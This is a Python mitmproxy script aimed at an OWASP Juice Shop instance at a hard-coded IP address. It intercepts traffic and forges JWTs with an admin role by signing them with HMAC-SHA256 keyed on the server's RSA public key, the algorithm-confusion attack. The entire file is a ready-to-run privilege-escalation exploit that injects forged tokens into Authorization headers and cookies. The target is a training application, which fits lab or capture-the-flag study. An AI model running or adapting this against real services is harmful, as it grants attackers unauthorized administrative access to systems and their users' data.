import json
import base64
import re
import hmac
import hashlib
import asyncio
from mitmproxy import http, options
from mitmproxy.tools.dump import DumpMaster

LISTEN_HOST = "127.0.0.1"
LISTEN_PORT = 8080
JUICE_URL_SNIPPET = "45.76.47.218:3000"

RSA_PUBLIC_KEY = """-----BEGIN RSA PUBLIC KEY-----
MIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=
-----END RSA PUBLIC KEY-----"""

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(data: str) -> bytes:
    padding = 4 - (len(data) % 4)
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)

def forge_admin_jwt(original_token: str) -> str:
    try:
        # Split token
        header_b64, payload_b64, _ = original_token.split(".")
        header = json.loads(b64url_decode(header_b64))
        payload = json.loads(b64url_decode(payload_b64))

        # Modify payload to set admin role
        payload["role"] = "admin"

        # Re-encode header and payload
        new_header_b64 = b64url_encode(json.dumps(header).encode())
        new_payload_b64 = b64url_encode(json.dumps(payload).encode())

        # Create signature using HMAC-SHA256
        message = f"{new_header_b64}.{new_payload_b64}"
        signature = hmac.new(
            RSA_PUBLIC_KEY.encode(),
            message.encode(),
            hashlib.sha256
        ).digest()

        # URL-safe base64 encode the signature
        signature_b64 = b64url_encode(signature)

        # Combine all parts
        forged_token = f"{new_header_b64}.{new_payload_b64}.{signature_b64}"

        return forged_token
    except Exception as e:
        print(f"[!] Error forging admin token: {e}")
        return original_token

class AdminSectionAccess:
    def request(self, flow: http.HTTPFlow):
        if JUICE_URL_SNIPPET not in flow.request.pretty_url:
            return

        # Intercept JWT in Authorization header
        auth_header = flow.request.headers.get("Authorization", "")
        if auth_header.startswith("Bearer "):
            original_token = auth_header.removeprefix("Bearer ").strip()
            try:
                forged = forge_admin_jwt(original_token)
                flow.request.headers["Authorization"] = f"Bearer {forged}"
                print("[*] Authorization: Admin token injected!")
            except Exception as e:
                print(f"[!] Error forging admin token: {e}")

        # Intercept JWT in cookies
        cookie = flow.request.headers.get("cookie", "")
        if "token=" in cookie:
            match = re.search(r"token=([^;]+)", cookie)
            if match:
                cookie_token = match.group(1)
                try:
                    forged = forge_admin_jwt(cookie_token)
                    new_cookie = re.sub(r"token=[^;]+", f"token={forged}", cookie)
                    flow.request.headers["cookie"] = new_cookie
                    print("[*] Cookie: Admin token injected!")
                except Exception as e:
                    print(f"[!] Error forging cookie token: {e}")

async def run_proxy():
    opts = options.Options(listen_host=LISTEN_HOST, listen_port=LISTEN_PORT)
    m = DumpMaster(opts)
    m.addons.add(AdminSectionAccess())
    try:
        await m.run()
    except KeyboardInterrupt:
        print("[!] Proxy interrupted.")
    finally:
        m.shutdown()

def admin_section_access():
    asyncio.run(run_proxy())